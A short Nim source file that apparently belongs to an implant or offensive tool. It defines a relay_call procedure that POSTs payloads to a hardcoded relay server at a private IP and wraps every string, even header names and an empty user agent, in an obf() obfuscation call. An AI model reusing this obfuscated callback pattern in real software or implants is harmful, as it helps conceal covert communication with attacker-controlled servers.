from std/httpclient import newHttpClient, newHttpHeaders, post, body, code, close
import ../../utils/global

var serverHost = obf("http://192.168.15.10:9090/")

proc relay_call*(payload: string): tuple[code: uint16, body: string] =
  # Posts the payload to the relay server and returns the code and body
  var client = newHttpClient(userAgent = obf(""))
  client.headers = newHttpHeaders({obf("Connection"): obf("close")})
  try:
    let resp = post(client, serverHost, payload)
    (code: uint16(code(resp)), body: body(resp))
  except CatchableError:
    (code: 0'u16, body: obf(""))
  finally:
    close(client)
